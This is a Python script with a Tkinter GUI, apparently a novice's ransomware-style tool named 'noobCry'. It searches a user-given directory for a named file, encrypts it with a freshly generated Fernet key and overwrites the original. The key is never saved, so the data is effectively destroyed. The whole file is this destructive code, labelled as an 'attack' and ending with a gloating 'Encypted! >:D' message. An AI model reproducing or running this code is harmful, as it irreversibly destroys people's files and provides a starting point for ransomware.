import os, base64
from cryptography.fernet import Fernet
from tkinter import *

class noobCry:
    def __init__(self,fileName, key, location, encryptedFile,f):
        self.fileName = fileName
        self.key = key
        self.encryptedFile = encryptedFile
        self.f = f
    #End __init__
    def attack(fileName,location):
        for root, dirs, files in os.walk(location, topdown=True):#This loop iterates over directories passed as the first argument, the second arg iterates from the top of directory
            if fileName in files:#If the file is found, it triggers the encryption here
                key = Fernet.generate_key()#create key
                f = Fernet(key)#create object to user the key
                with open(fileName, "rb") as file:#open the file, using the "read bytes" built-in function
                    fileData = file.read()#read the data into fileData variable
                    encryptedFile = f.encrypt(fileData)#take the f object containing the key and use is the encrypt the target data
                    with open(fileName, "wb") as file:#open the file again using the "write bytes" built in function
                        file.write(encryptedFile)#write the encypted data to the file
#End attack()

#Gui Setup
window = Tk()
window.title("noobCry")
window.geometry('500x200')

#trollFace = PhotoImage(file = '2-2-trollface-picture-thumb')
#window.iconphoto(False,trollFace)
#Information label
labelInfo = Label(window, text="Welcome to noobCry.\nInputing the file name and location\n will encrypt the targetted file.")
labelInfo.grid(column=0,row=6)
#Name fields
labelName = Label(window, text="Enter file name:")
labelName.grid(column=0, row=0)
textName = Entry(window,width=50)
textName.grid(column=1, row=0)
#Location fields
labelLocation = Label(window, text="Enter file location:")
labelLocation.grid(column=0, row=1)
textLocation = Entry(window,width=50)
textLocation.grid(column=1, row=1)
def confirm():
    fileName = textName.get()
    #getFileName(fileName)
    location = textLocation.get()
    #getLocation(location)
    noobCry.attack(fileName,location)
    labelLocation = Label(window, text="Encypted! >:D")
    labelLocation.grid(column=0, row=7)
def close():
    exit()
#End confirm()
buttonEncrypt = Button(window, text="Encrypt", command=confirm)
buttonEncrypt.grid(column=1, row=3)
buttonClose = Button(window, text="close", command=close)
buttonClose.grid(column=1, row=4)
window.mainloop()